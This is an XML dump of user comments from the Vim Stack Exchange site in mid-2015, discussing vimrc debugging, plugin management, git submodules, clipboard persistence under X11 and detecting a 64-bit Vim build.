  <row Id="5279" PostId="3692" Score="0" Text="One simple way to change $TERM variable in gonome-terminal http://superuser.com/a/870547/424027&#xA;gnome-terminal has no settings for this." CreationDate="2015-06-28T06:06:44.917" UserId="1145" />
  <row Id="5280" PostId="3733" Score="0" Text="If you decide to take &quot;definition search&quot; for a ride, you'll probably find [this plugin of mine](https://github.com/romainl/vim-qlist) handy." CreationDate="2015-06-28T08:39:42.907" UserId="54" />
  <row Id="5281" PostId="3751" Score="0" Text="Does this also happen in you start Vim with no vimrc file (`vim -u NONE`)?" CreationDate="2015-06-28T11:11:19.543" UserId="51" />
  <row Id="5282" PostId="3747" Score="0" Text="If I'm understanding correctly, you're saying the entire file isn't sourced &amp; executed prior to the execution of the function call defined in my vimrc? Maybe I'm misunderstanding ... but it seems to me the entire autoload script is sourced &amp; executed first.  If I add a the statement `echom 'this is the function call'` in the function being called from vimrc and another `echom 'file was sourced'` anywhere else in the file (not in a function), I see the latter first, then the former." CreationDate="2015-06-28T12:04:08.880" UserId="2207" />
  <row Id="5283" PostId="3747" Score="0" Text="Sorry, I just realized what you're saying - and that you're correct. Since the function call is happening in the script  as it is sourced, it needs to happen after the function is defined. Thank you!" CreationDate="2015-06-28T12:05:39.977" UserId="2207" />
  <row Id="5284" PostId="2710" Score="0" Text="Note that `autoread` is rather limited; it only checks if the file is changed when certain events occur. [Also see my answer here](http://vi.stackexchange.com/a/2731/51)." CreationDate="2015-06-28T12:17:26.510" UserId="51" />
  <row Id="5285" PostId="3752" Score="1" Text="Even though I don't know of a way of converting markdown to vim's help file type, I do know of a good introduction to writing them: http://learnvimscriptthehardway.stevelosh.com/chapters/54.html" CreationDate="2015-06-28T12:46:47.183" UserId="865" />
  <row Id="5286" PostId="3751" Score="0" Text="Nope... so this is an issue in my vimrc, right?" CreationDate="2015-06-28T12:51:27.537" UserId="2627" />
  <row Id="5287" PostId="3751" Score="1" Text="Looks like it :-) try: [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/51) and post the settings that cause this behaviour." CreationDate="2015-06-28T13:08:22.187" UserId="51" />
  <row Id="5288" PostId="3751" Score="0" Text="it seems that was a bug in the version i had in vim-airline.  I followed the posts instructions on how to debug my vimrc, i commented out the plugins and everything worked ok.  So i started commenting out one by one each plugin, and when i did so in vim-airline it bugged again.  So i found out how to update my plugins (vim +PluginUpdate) and now everything works ok.  Thnx @Carpetsmoker." CreationDate="2015-06-28T13:59:13.803" UserId="2627" />
  <row Id="5290" PostId="3753" Score="0" Text="It sounds like you're using vundle as your plugin manager. If so, you can also update your plugins from within an existing vim session with the `:PluginUpdate` command." CreationDate="2015-06-28T15:49:06.627" UserId="2618" />
  <row Id="5291" PostId="3589" Score="1" Text="You can just use `&lt;Esc&gt;`, you don't need to use `&lt;C-c&gt;`. The difference is that `&lt;C-c&gt;` aborts whatever Vim is doing (such as running a function), and `&lt;Esc&gt;` doesn't. You almost never want to use `&lt;C-c&gt;` unless you want to &quot;kill&quot; something." CreationDate="2015-06-28T16:40:10.640" UserId="51" />
  <row Id="5292" PostId="3583" Score="4" Text="You can use `set showcmd` to show the keys you've typed in the bottom-right corner." CreationDate="2015-06-28T16:40:52.083" UserId="51" />
  <row Id="5293" PostId="3753" Score="0" Text="this is true, i will update my answer regarding this." CreationDate="2015-06-28T18:27:07.190" UserId="2627" />
  <row Id="5295" PostId="3755" Score="1" Text="This is really [the same problem as this question](http://vi.stackexchange.com/q/365/51); in my answer I've written a (markdown-specific) workaround, but it's ugly and has a number of side-effects..." CreationDate="2015-06-28T22:46:51.987" UserId="51" />
  <row Id="5296" PostId="3712" Score="0" Text="This is pretty cool. Thanks." CreationDate="2015-06-29T04:09:30.923" UserId="1262" />
  <row Id="5299" PostId="3756" Score="1" Text="I'm pretty sure you want to at least change `if &amp;term == &quot;^xterm&quot;` to `if &amp;term =~ &quot;^xterm&quot;` and `&amp;term =~ &quot;^screen&quot;` Changing this makes it work in `xterm` and `xterm`+`tmux` for me. I commented out the second part as this changed my terminal's font(!). Didn't test all the other terminals." CreationDate="2015-06-29T08:24:11.580" UserId="51" />
  <row Id="5300" PostId="3756" Score="0" Text="It looks like the `tmux` part is sending Escape code 50 (`&lt;Esc&gt;]50`), which is a OSX specific thing. See: [Escape code 50 in xterm](http://unix.stackexchange.com/q/152369/33645)." CreationDate="2015-06-29T08:27:18.533" UserId="51" />
  <row Id="5301" PostId="3756" Score="0" Text="http://vi.stackexchange.com/a/3456/1145&#xA;Very similar." CreationDate="2015-06-29T08:58:09.263" UserId="1145" />
  <row Id="5302" PostId="3756" Score="1" Text="You can try the [togglecursor plugin](https://github.com/jszakmeister/vim-togglecursor). Not sure if it works with cygwin, though. I'd recommend skimming over the help file for more info on what terminals are supported." CreationDate="2015-06-29T09:49:02.510" UserId="20" />
  <row Id="5303" PostId="3758" Score="0" Text="and then? how do i proceed? how do i fetch the data from the submodules to my local folder?" CreationDate="2015-06-29T11:46:07.977" UserId="2627" />
  <row Id="5304" PostId="3758" Score="0" Text="@h1k3n O.o That's what those commands are for. `git submodule update --init` should clone the Vundle repository." CreationDate="2015-06-29T11:48:06.777" UserId="205" />
  <row Id="5305" PostId="3758" Score="0" Text="i feel lost.  let me revisit this in the afternoon when i cool my head as it has been a tough day here in Greece. Thnx though, it seems that this topic stepped in a black area for me in git (submodules) that i need to explore." CreationDate="2015-06-29T11:51:18.780" UserId="2627" />
  <row Id="5306" PostId="3717" Score="0" Text="Thanks for your answer and sorry for my late comment! First: your method seems to be more reliable than mine combined with the comment of CarpetSmoker (using `&lt;C-w&gt;o`) but I haven't tested it yet in full depth. Secondly I have a question: with you method just like with mine, the help buffer seems to disapear (just like I described it in the comment on my question), is it an expected behavior? And if so is it possible to get rid of it so I can open an help buffer and then switch between it and my others buffers?" CreationDate="2015-06-29T15:14:12.200" UserId="1841" />
  <row Id="5307" PostId="3717" Score="0" Text="Help buffers are unlisted so they do not show up in `:ls` or navigable via simple `:bn`/`:bp` commands. To see unlisted buffers do `:ls!`. Now if you use `&lt;c-^&gt;`/`&lt;c-6&gt;` you can easily switch between the current buffer and the alternative buffer. I remap this command to backspace via `nnoremap &lt;bs&gt; &lt;c-^&gt;` to make switching easier. If you really want to switch between the buffers you can do `set buflisted` around line 7 of the function, but that will clutter up your buffer list." CreationDate="2015-06-29T15:40:49.203" UserId="778" />
  <row Id="5308" PostId="2118" Score="0" Text="This works for me most of the time (so I'm upvoting), however I tend to hit `:w` habitually whenever I pause for a while, so if I've been working on a file most of the day and only want to undo stuff from the last session of edits, it's quite tricky to use `:earlier`. Normally in this case I just look at my undo tree with gundo and find the right spot that way." CreationDate="2015-06-29T15:54:56.623" UserId="1094" />
  <row Id="5309" PostId="3717" Score="0" Text="I think the `&lt;c-^&gt;/&lt;c-6&gt;` trick is what I was looking for, and I'll probably remap it too because on my azerty keyboard it's absolutely not convenient. Thank you for these additionnal informations!" CreationDate="2015-06-29T15:56:52.010" UserId="1841" />
  <row Id="5310" PostId="3716" Score="0" Text="@Carpetsmoker: I just accepted Peter's answer, but could you make your solution an answer? It is what I was looking for on the beginning and it solve my problem so I think that is worth an answer :)" CreationDate="2015-06-29T15:59:24.353" UserId="1841" />
  <row Id="5311" PostId="3565" Score="1" Text="Thanks for the great answer, @akshay; TYLTK it's up with the very best: http://vi.stackexchange.com/search?tab=votes&amp;q=is%3Aa#answer-id-242" CreationDate="2015-06-29T16:40:09.277" UserId="2221" />
  <row Id="5313" PostId="3672" Score="0" Text="I believe what NeoVim wants to achieve is a VimScript to Lua transpiler, so they can use the LuaJIT runtime. So I'm wondering if the Lua engine is already integrated anywhere..." CreationDate="2015-06-29T20:34:32.847" UserId="2554" />
  <row Id="5314" PostId="3760" Score="0" Text="I can confirm that the `togglebg` doesn't work very well in `xterm` (although it works fine for me in gVim)..." CreationDate="2015-06-29T22:54:12.503" UserId="51" />
  <row Id="5315" PostId="3760" Score="0" Text="Possibly related: http://vi.stackexchange.com/questions/1890/why-does-the-order-of-set-bg-dark-and-set-bg-light-matter#comment1157_1891" CreationDate="2015-06-30T01:55:42.180" UserId="205" />
  <row Id="5317" PostId="3758" Score="0" Text="I used those commands but they show no output and at the end i have only the folders of each submodule (maybe they aren't submodules in my case after all?).  I think i have made a mistake in the initialization of the process." CreationDate="2015-06-30T06:26:30.577" UserId="2627" />
  <row Id="5318" PostId="3758" Score="0" Text="@h1k3n Guess I was wrong - when you added the bundle directory, the plugin directories *didn't* become proper submodules, but only git links. See http://stackoverflow.com/a/4162672/2072269. Essentially, in your original repo, do `git rm --cached` for the plugin directories, then re-add them as submodules." CreationDate="2015-06-30T06:35:56.690" UserId="205" />
  <row Id="5320" PostId="3762" Score="0" Text="How about the `$MACHTYPE` environment variable? I'm not sure how portable that is, though, but at least `tcsh` and `bash` seem to set it." CreationDate="2015-06-30T07:48:03.710" UserId="51" />
  <row Id="5321" PostId="3762" Score="0" Text="@Carpetsmoker hmmm... What if you have 32-bit vim on a 64-bit system? (Say, `sudo apt-get install vim:i386` on a 64-bit Ubuntu)" CreationDate="2015-06-30T07:49:43.717" UserId="205" />
  <row Id="5322" PostId="3762" Score="0" Text="Yeah, it would only check what the host system's using, not how Vim is compiled... Also a small caveat about your answer: it doesn't necessarily check the Vim binary you're running, but rather the 'default' Vim (which may be a different binary)." CreationDate="2015-06-30T07:54:07.797" UserId="51" />
  <row Id="5323" PostId="3762" Score="0" Text="@Carpetsmoker how about the update?" CreationDate="2015-06-30T08:07:50.770" UserId="205" />
  <row Id="5324" PostId="3762" Score="0" Text="Sorry for the spam, but you can use this to get the path to the current binary: `resolve('/proc/' . getpid() . '/exe')` ... Should work on most Unix-y systems which have a `/proc`" CreationDate="2015-06-30T08:07:51.143" UserId="51" />
  <row Id="5325" PostId="3762" Score="0" Text="@Carpetsmoker yes, the `/proc/$PID/exe` should be safer in case the running binary got deleted or replaced." CreationDate="2015-06-30T08:14:50.310" UserId="205" />
  <row Id="5326" PostId="3762" Score="0" Text="Wow, that's more complicated than expected. The first two approaches work, but I don't understand how I could use the &quot;within-vim-way&quot;: I tried putting this into the vimrc or executing it directly..." CreationDate="2015-06-30T08:17:56.617" UserId="2645" />
  <row Id="5327" PostId="3762" Score="0" Text="If it helps: Vim ist telling me: `E121: Undefined variable: v:progpath`" CreationDate="2015-06-30T08:20:47.543" UserId="2645" />
  <row Id="5328" PostId="3762" Score="0" Text="@caligula if you put that in vimrc as-si, you would get `yes`  then `Press Enter or type command to continue` when you start a 64-bit vim. (At least, I do.) It all depends on why you want to know this. As I understand it, the APIs on Windows change depending on whether you have win64 or win32 or something else, that's why they have that check. APIs on Linux usually don't change because you have 32-bit or 64-bit." CreationDate="2015-06-30T08:21:05.843" UserId="205" />
  <row Id="5329" PostId="3762" Score="0" Text="@caligula if that's the case `v:progpath` must have been introduced in Vim 7.4. Try Carpetsmoker's test: `if system('file &quot;' . resolve('/proc/' . getpid() . '/exe') . '&quot;') =~ &quot;64-bit&quot; ...`" CreationDate="2015-06-30T08:22:26.073" UserId="205" />
  <row Id="5330" PostId="3762" Score="0" Text="Ok, had some trouble I can't reproduce, but it's working now anyways :) Thx" CreationDate="2015-06-30T08:36:36.413" UserId="2645" />
  <row Id="5331" PostId="3761" Score="3" Text="Out of curiosity, why is that information important for you?" CreationDate="2015-06-30T08:37:46.843" UserId="54" />
  <row Id="5332" PostId="3763" Score="0" Text="If `readfile` supports reading from symlinks, then read directly from `/proc/$PID/exe`. I'm not sure how `resolve` will behave with deleted commands." CreationDate="2015-06-30T08:39:43.763" UserId="205" />
  <row Id="5333" PostId="3761" Score="1" Text="Because I'm trying to open a large file (5.1GB)" CreationDate="2015-06-30T08:42:16.263" UserId="2645" />
  <row Id="5334" PostId="3761" Score="0" Text="@caligula might be useful: http://vi.stackexchange.com/questions/149/how-can-i-open-very-large-files-with-good-performance" CreationDate="2015-06-30T08:53:58.187" UserId="205" />
  <row Id="5335" PostId="3761" Score="0" Text="Yes thanks, I'm actually already using that (including the linked stuff), but I'm still having problems. Perhaps I'll soon be able to ask a question, but for now I'm still trying..." CreationDate="2015-06-30T09:09:22.733" UserId="2645" />
  <row Id="5336" PostId="3761" Score="0" Text="ANd you are trying to open a 5.1 GB file for *editing* or for *viewing*? If the latter, why not use a pager instead? Or some grep/sed before sending to Vim?" CreationDate="2015-06-30T09:24:06.743" UserId="54" />
  <row Id="5337" PostId="3761" Score="0" Text="Unfortunately it's the former ;) Question is incoming :/" CreationDate="2015-06-30T09:29:30.787" UserId="2645" />
  <row Id="5338" PostId="3761" Score="1" Text="`-I/usr/lib/x86_64-linux-gnu/...` - those are 64-bit includes." CreationDate="2015-06-30T10:08:45.887" UserId="1577" />
  <row Id="5339" PostId="3763" Score="1" Text="Once you reference `/proc` that way it isn't &quot;pure Vim&quot;, it's &quot;Linux Vim&quot;. :)" CreationDate="2015-06-30T10:09:59.963" UserId="1577" />
  <row Id="5340" PostId="3763" Score="0" Text="@lcd047 sort of but not really. `procfs` predates Linux by a decade, many systems have it. Linux did extend it heavily, and &quot;as expected&quot; in the world of Unix different implementations are not compatible ([`/proc/&lt;pid&gt;/path`](http://docs.oracle.com/cd/E23824_01/html/821-1473/proc-4.html#REFMAN4proc-4),&#xA;[`/proc/&lt;pid&gt;/file`](http://www.freebsd.org/cgi/man.cgi?query=procfs&amp;apropos=0&amp;sektion=0&amp;manpath=FreeBSD+10.1-RELEASE&amp;arch=default&amp;format=html))... Some systems may not have it, but making *anything* truly Unix-wide compatible without explicitly coding it (`#ifdef` etc.) is damn near impossible." CreationDate="2015-06-30T10:21:57.690" UserId="51" />
  <row Id="5346" PostId="3767" Score="0" Text="Add it to `~/.vim/syntax`?" CreationDate="2015-06-30T12:16:42.600" UserId="205" />
  <row Id="5350" PostId="3769" Score="0" Text="@Carpetsmoker, I meant *X11's buffers*, not *Vim's registers*, but this will do as well." CreationDate="2015-06-30T14:04:30.473" UserId="205" />
  <row Id="5351" PostId="3769" Score="0" Text="AFAIK for the `*` register at least (middle click), this is expected. As X does a request to the application with the last selection to get the contents." CreationDate="2015-06-30T14:04:40.630" UserId="51" />
  <row Id="5352" PostId="3769" Score="0" Text="@Carpetsmoker that seems to be the case. Any idea for `+`?" CreationDate="2015-06-30T14:05:23.690" UserId="205" />
  <row Id="5353" PostId="3769" Score="0" Text="Looks like it. See [here](https://bugs.launchpad.net/ubuntu/+bug/11334) and  [here](https://bugs.launchpad.net/ubuntu/+bug/106644)... I believe the answer to this is using something like [Parcellite](http://parcellite.sourceforge.net/), although I've found that these apps often come with their own problems and quircks..." CreationDate="2015-06-30T14:13:44.457" UserId="51" />
  <row Id="5354" PostId="3769" Score="0" Text="@muru The third comment to the second post you linked to explains what's going on: _[The] process is the following: 1. You copy text. 2. Vim tells X that it has data for clipboard («tells that it has data», not «puts data into clipboard»). 3. You exit vim. 4. X now has no idea where he can get data for clipboard: clipboard is «cleared»_" CreationDate="2015-06-30T14:24:32.547" UserId="1577" />
  <row Id="5355" PostId="3769" Score="0" Text="@lcd047 I read that. So how do I get it to *«puts data into clipboard»*, as they say?" CreationDate="2015-06-30T14:26:08.037" UserId="205" />
  <row Id="5356" PostId="3769" Score="0" Text="@muru: The next comment to the same post outlines a possible workaround: _create a daemon that when something tells X that it (something) has data for clipboard will obtain this data and in turn tell X that it (daemon) has this data. In this case when something exits, daemon will still be present and able to give this data. Search for «clipboard manager» in your repository, it should solve this issue_." CreationDate="2015-06-30T14:28:19.433" UserId="1577" />
  <row Id="5357" PostId="3769" Score="0" Text="@lcd047 &quot;... without using an external utility&quot;" CreationDate="2015-06-30T14:28:49.243" UserId="205" />
  <row Id="5358" PostId="3769" Score="0" Text="... Then you're opposing to solving your own problem. :) Really, Vim can't do that on its own." CreationDate="2015-06-30T14:30:52.353" UserId="1577" />
  <row Id="5359" PostId="3767" Score="1" Text="The version in `/usr/share/vim/vim74/syntax` is by &quot;Dr. Chip&quot; too.  It's just an older version of the file." CreationDate="2015-06-30T14:31:51.207" UserId="15" />
  <row Id="5360" PostId="3769" Score="0" Text="On a side note: ZyX used to be one of the main Vim developers (he seems more interested in neovim these days, although he still posts patches for Vim occasionally)." CreationDate="2015-06-30T14:33:31.273" UserId="1577" />
  <row Id="5361" PostId="3769" Score="0" Text="@lcd047 Why not? Other applications don't beat around the bush when I copy to clipboard (say, right-click and copy). Why Vim? Even selecting the text with a mouse and using the terminal's right-click &amp; copy works as expected." CreationDate="2015-06-30T14:33:47.707" UserId="205" />
  <row Id="5362" PostId="3769" Score="0" Text="How would I know?  I didn't write that piece of code, sorry.  I never even looked at it." CreationDate="2015-06-30T14:38:57.623" UserId="1577" />
  <row Id="5363" PostId="3769" Score="0" Text="@lcd047 Code would a bit much, but documentation saying you can't would answer this question." CreationDate="2015-06-30T14:39:50.920" UserId="205" />
  <row Id="5364" PostId="3769" Score="0" Text="Don't have any official reference either, sorry." CreationDate="2015-06-30T14:46:00.853" UserId="1577" />
  <row Id="5367" PostId="3770" Score="0" Text="Then I must hunt for something else causing this. Or something's messed with my `primary` and `clipboard`." CreationDate="2015-06-30T14:52:36.697" UserId="205" />
  <row Id="5368" PostId="3770" Score="0" Text="Are you sure you aren't causing another application to assert ownership of those in the interim?  Are you sure the application you want to paste into will look at the cut buffers if nothing is asserting ownership of one of the selections?" CreationDate="2015-06-30T14:55:38.523" UserId="15" />
  <row Id="5369" PostId="3770" Score="0" Text="I doubt the former (been careful not to select any text), but about the latter, not at all sure." CreationDate="2015-06-30T14:56:32.537" UserId="205" />
  <row Id="5370" PostId="3763" Score="1" Text="I knew I was forgetting something! We're *within* Vim, so we don't need the PID. `/proc/self/exe`!" CreationDate="2015-06-30T17:05:14.580" UserId="205" />
  <row Id="5371" PostId="3762" Score="0" Text="&quot;We need to use readlink because...&quot; On POSIX systems, file won't say &quot;Symbolic link&quot; unless `-h` is specified. For GNU file, use `file -L [filename]`." CreationDate="2015-06-30T17:48:49.673" UserId="880" />
  <row Id="5372" PostId="3761" Score="0" Text="In this case since you're on a 64-bit system and the gcc options don't include `-m32`, it's 64-bit. It's safe to assume that any package that came with your system is 64-bit, except for a very few rare apps that are only available in 32-bit form. The situation isn't the same as Windows where very many apps are still 32-bit." CreationDate="2015-06-30T19:26:00.517" UserId="2658" />
  <row Id="5373" PostId="3773" Score="6" Text="Is it possible? Absolutely! Case and point: [textobj-word-column.vim](https://github.com/coderifous/textobj-word-column.vim)" CreationDate="2015-06-30T19:46:06.937" UserId="778" />
  <row Id="5374" PostId="3773" Score="0" Text="@PeterRincker This is nice, but I wonder if it couldn't be simplified to take advantage of Kana's [textobj-user](https://github.com/kana/vim-textobj-user/wiki)." CreationDate="2015-06-30T23:01:36.073" UserId="1577" />
  <row Id="5375" PostId="3775" Score="1" Text="Look at the files in `$VIMRUNTIME/indent`.  They work by setting `indentexpr`.  Create a file for Handlebars that, err, handles the patterns you want, and return `HtmlIndent()` for everything else." CreationDate="2015-06-30T23:10:36.793" UserId="1577" />
  <row Id="5376" PostId="3774" Score="0" Text="`:E` is no less convenient than `&lt;C-o&gt;`. But `:E` is easier to remember since I can group it together with `:e`, `:sp.`, `:vs.` etc." CreationDate="2015-07-01T00:08:44.113" UserId="1080" />
  <row Id="5377" PostId="3769" Score="0" Text="What about shift+insert ? did you try?" CreationDate="2015-07-01T00:30:30.457" UserDisplayName="user2663" />
  <row Id="5378" PostId="3762" Score="0" Text="@Random832 Thanks! Yes, you're right, the manpage says `-L ... is the default if the environment variable POSIXLY_CORRECT is defined.`" CreationDate="2015-07-01T01:49:10.550" UserId="205" />
  <row Id="5379" PostId="3773" Score="0" Text="Thanks, Peter, that's exactly the sort of example I was looking for." CreationDate="2015-07-01T03:00:50.343" UserId="2657" />
  <row Id="5380" PostId="3767" Score="0" Text="Yep, the one already existing is much older than the one available on Dr. Chip's site. I forgot exact version, but IIRC the &quot;Last Change&quot; was in 2013 or something." CreationDate="2015-07-01T04:47:43.747" UserId="2647" />
  <row Id="5381" PostId="3773" Score="2" Text="@PeterRincker make this an answer :)" CreationDate="2015-07-01T11:02:08.847" UserId="599" />
  <row Id="5382" PostId="3780" Score="0" Text="I'm not sure that would be a good solution but according to `:help arabic` it is possible to write text right aligned when the option `+arabic` is enabled, maybe you could search for something this way... (Also I tend to think that if your purpose is just commenting code, you might not need a right-aligned presentation and write it in a regular way but thats only my opinion ;-) )" CreationDate="2015-07-01T15:17:01.520" UserId="1841" />
  <row Id="5383" PostId="3780" Score="0" Text="@statox `set rightleft` does that, but that also means that everything is reversed; so  `Hello, world` becomes `dlrow ,olleH` ;-)" CreationDate="2015-07-01T17:20:38.667" UserId="51" />
  <row Id="5384" PostId="3775" Score="0" Text="thanks @lcd047. That put me on the right track to get started hacking the vim-html5 plugin." CreationDate="2015-07-01T17:44:04.340" UserId="446" />
  <row Id="5385" PostId="3780" Score="0" Text="@Carpetsmoker: Oh I didn't know that but that makes sense... Actually that's why I made it a comment and not an answer because that was just a thought and I never used it :-)" CreationDate="2015-07-01T18:29:34.307" UserId="1841" />
  <row Id="5386" PostId="3782" Score="2" Text="Are you aware of the [`'confirm'`](http://vimhelp.appspot.com/options.txt.html#'confirm') option?I think that does pretty much what your funtion does?" CreationDate="2015-07-01T23:16:15.317" UserId="51" />
  <row Id="5387" PostId="3731" Score="0" Text="Quick update: I ran into an issue where this line ran every time I sourced my `.vimrc` file. If I sourced `.vimrc` more than once per session (_e.g.,_ when tinkering with `.vimrc` and trying to test the results), `viminfo`'s location would be set to `C:\Users\Ryan\vimfiles\viminfo,nC:\Users\Ryan\vimfiles\viminfo`. To resolve this, I wrapped this line in the following if statement: `if &amp;viminfo !~ ',n'` (which returns 0 if viminfo matches the string ',n')." CreationDate="2015-07-02T02:50:51.610" UserId="2593" />
  <row Id="5388" PostId="3782" Score="0" Text="@Carpetsmoker♦ I am aware of it, still I want to do it like this, because pressing F2 again is much simpler than pressing anything else. Using vimscript is about simplifying your life, isn't it? :-)" CreationDate="2015-07-02T09:14:05.047" UserId="2620" />
  <row Id="5389" PostId="3785" Score="0" Text="With *&quot;replaces any existing data&quot;* I assume you mean *&quot;Replaces all the existing tabs*? See: [How can I open multiple tabs at once?](http://vi.stackexchange.com/q/2108/51) for an explanation on why this happens, and a way to fix it." CreationDate="2015-07-02T11:38:54.333" UserId="51" />
  <row Id="5390" PostId="3785" Score="0" Text="Yeah that's right, any existing tab/tabs/buffers disappears running the above. I saw that for loop of yours earlier but was hoping it can be accomplished without writing a function. Perhaps that's not possible." CreationDate="2015-07-02T11:54:26.350" UserId="2676" />
  <row Id="5391" PostId="3785" Score="0" Text="You can put the code in a single line, if you want... `for f in glob(..) | execute ... | setlocal readonly | endfor` ... I don't see the problems with creating a function, though, as it's more readable." CreationDate="2015-07-02T12:05:50.960" UserId="51" />
  <row Id="5392" PostId="3785" Score="0" Text="Thanks, I ended up using the entire function for readability. It's not too much code after all!" CreationDate="2015-07-02T12:08:36.627" UserId="2676" />
  <row Id="5393" PostId="3788" Score="0" Text="[Here is an expanded version](https://gist.github.com/Carpetsmoker/1d9eda4d66daed954176) of the function which allows you to pass an expression; use it like: `:call OpenMultipleTabs(['/var/log/*'], 'setlocal readonly')` ..." CreationDate="2015-07-02T12:22:15.940" UserId="51" />
  <row Id="5395" PostId="3790" Score="0" Text="It looks like this plugin overrides `a&quot;`, and uses `A&quot;` for the original behaviour?" CreationDate="2015-07-02T12:53:28.443" UserId="51" />
  <row Id="5396" PostId="3790" Score="0" Text="... while, I believe, also allowing seeking &quot;to the left&quot;" CreationDate="2015-07-02T12:56:03.253" UserId="1800" />
  <row Id="5397" PostId="3788" Score="0" Text="That last one did not work for me. They are opened in tabs but readonly is not set." CreationDate="2015-07-02T13:51:03.760" UserId="2676" />
  <row Id="5398" PostId="3792" Score="2" Text="Your problem is `:global` operates on entire lines only, and not the matching part. So you're running `~` for every line (which should convert the first character, `f`, to `F`). No time to write a more expanded answer right now, but at least you know your problem ;-)" CreationDate="2015-07-02T17:54:05.360" UserId="51" />
  <row Id="5399" PostId="3793" Score="0" Text="Yes, but I would like to perform an arbitrary command at every match." CreationDate="2015-07-02T18:02:04.513" UserId="2678" />
  <row Id="5400" PostId="3793" Score="1" Text="The simplest would be to perform a search `\v&lt;[whnm]&gt;`, press `~` (or whatever command), and then it is just a matter of hitting `n.` repeatedly (and that could be automated)." CreationDate="2015-07-02T18:10:31.510" UserId="1800" />
  <row Id="5401" PostId="3793" Score="1" Text="Forgo the capture group as we can use `\0`/`&amp;`. e.g. `:'a,'bs/\&lt;[whnm]\&gt;/\U&amp;/g`." CreationDate="2015-07-02T18:12:51.423" UserId="778" />
  <row Id="5402" PostId="3793" Score="0" Text="@Peter Rincker - Yes, that's even nicer!" CreationDate="2015-07-02T18:16:30.817" UserId="1800" />
  <row Id="5403" PostId="3792" Score="0" Text="To me, it seems like vim's problem instead of my problem.  I've been using vim exclusively for a couple of years, and have recently begun to try to step up my vim sophistication level.  I keep bumping into this butterfly every once in a while, and I'd like to kill it and pin it to the page." CreationDate="2015-07-02T19:38:59.940" UserId="2678" />
  <row Id="5404" PostId="3655" Score="0" Text="@romainl, I have done as you requested. I hope it helps." CreationDate="2015-07-02T19:58:32.130" UserId="2511" />
  <row Id="5405" PostId="3655" Score="0" Text="@lcd047, your suggestion does indeed produce the proper behavior, but why isn't my function working without it?" CreationDate="2015-07-02T20:00:54.920" UserId="2511" />
  <row Id="5406" PostId="3676" Score="0" Text="Thanks for the info on `search()`. However, setting @/ is what I actually wanted to do by using `normal` instead." CreationDate="2015-07-02T20:04:52.110" UserId="2511" />
  <row Id="5407" PostId="3657" Score="0" Text="Forcing its storage by setting `@/` worked. Thanks! However, what do you mean `/` resets after the function completes? The search in question shows up when I hit `/` followed by the up arrow when back in normal mode after running my function, so doesn't that mean it didn't reset?" CreationDate="2015-07-02T20:10:38.863" UserId="2511" />
  <row Id="5408" PostId="3325" Score="0" Text="what does `!exists(&quot;s:std_in&quot;)` mean?" CreationDate="2015-07-02T20:50:30.753" UserId="2681" />
  <row Id="5409" PostId="3800" Score="0" Text="Using visual selector with ! also does not work because it replaces the whole line and doesn't just insert on a single character." CreationDate="2015-07-02T21:43:11.353" UserId="1417" />
  <row Id="5410" PostId="3799" Score="0" Text="Thanks for the in-depth explanation, that clears up a lot of my confusions. By the way, I discovered Apprentice while browsing for color schemes a few weeks ago, and its one of my favorites!" CreationDate="2015-07-02T21:46:55.710" UserId="2061" />
  <row Id="5411" PostId="3801" Score="0" Text="I got it working using C-f Thanks a ton! `inoremap &lt;expr&gt; &lt;C-f&gt; strftime('%y-%m-%d %H:%M:%S')`" CreationDate="2015-07-02T22:08:33.987" UserId="1417" />
  <row Id="5412" PostId="3799" Score="2" Text="Note that you can write your colorscheme in such a way to use RGB colors when available (gVim, xterm customized palette), but fall back to the standard xterm colours if that's not available. [Solarized does this](https://github.com/altercation/vim-colors-solarized/blob/master/colors/solarized.vim#L243) for example. You can eat your cake and have it too!" CreationDate="2015-07-03T00:19:36.700" UserId="51" />
  <row Id="5414" PostId="3803" Score="0" Text="This solved the issue. Thank you!" CreationDate="2015-07-03T01:49:10.987" UserId="2479" />
  <row Id="5415" PostId="3807" Score="3" Text="... And that's because the characters above and below the highlighted ones in the wrapped lines correspond to other columns.  Doing it any other way would be misleading." CreationDate="2015-07-03T05:55:14.720" UserId="2313" />
  <row Id="5416" PostId="3655" Score="0" Text="Your function doesn't work because `n` and `N` use the `/` register, and `search()` doesn't update the `/` register." CreationDate="2015-07-03T07:34:01.713" UserId="1577" />
  <row Id="5417" PostId="2046" Score="0" Text="Just for reference I found lldb plugin @ https://github.com/gilligan/vim-lldb/ and screenshots look promising." CreationDate="2015-07-03T07:43:00.640" UserId="784" />
  <row Id="5418" PostId="3676" Score="0" Text="@Gantron Right; updated the answer." CreationDate="2015-07-03T09:19:02.383" UserId="51" />
  <row Id="5419" PostId="3811" Score="5" Text="Note that modifying `iskeyword` has a lot of side-effects. For example `dw` on `some-text` will now delete `some-text`, instead of only `some`. Not necessarily a bad thing, but something to be aware of." CreationDate="2015-07-03T09:59:44.923" UserId="51" />
  <row Id="5420" PostId="3813" Score="2" Text="In your mappings, why not use `:tabmove -1` and `:tabmove +1`?" CreationDate="2015-07-03T13:27:19.373" UserId="64" />
  <row Id="5421" PostId="3813" Score="0" Text="@tommcdo: Well... I made those mappings several months ago and I have no idea of what was in my mind at this moment. And I didn't event gave a thought about it when I copied it in my answer. Anyway you're totally right I'll edit my answer to make is simpler thanks for the heading :-)" CreationDate="2015-07-03T13:33:49.710" UserId="1841" />
  <row Id="5422" PostId="3816" Score="0" Text="I personally don't use folding, and you shuld not need to. Just organise your vimrc and it should all be good." CreationDate="2015-07-03T13:48:03.880" UserId="2689" />
  <row Id="5423" PostId="3816" Score="0" Text="My vimrc is already organized in section (general options, plugins, mappings, navigation, color, etc...). The fact to be able to fold a section (or subsection) is actually good to focus on what you're editing/ looking for." CreationDate="2015-07-03T13:51:50.053" UserId="1841" />
  <row Id="5424" PostId="3817" Score="0" Text="I forgot to precise that in my question: I'm not a a fan of &quot;separating&quot; the `vimrc` in different files because (IMO) it increase the complexity and make it more difficult to maintain. About the folding what do you mean by &quot;off to the right side with spacing&quot;?" CreationDate="2015-07-03T13:54:30.150" UserId="1841" />
  <row Id="5425" PostId="3814" Score="0" Text="[My vimrc](https://github.com/romainl/dotvim/blob/master/vimrc) is a little less than 400 lines long without being messy and without folds." CreationDate="2015-07-03T14:13:30.290" UserId="54" />
  <row Id="5426" PostId="3816" Score="0" Text="Okay. Sorry for bad answer." CreationDate="2015-07-03T14:18:03.197" UserId="2689" />
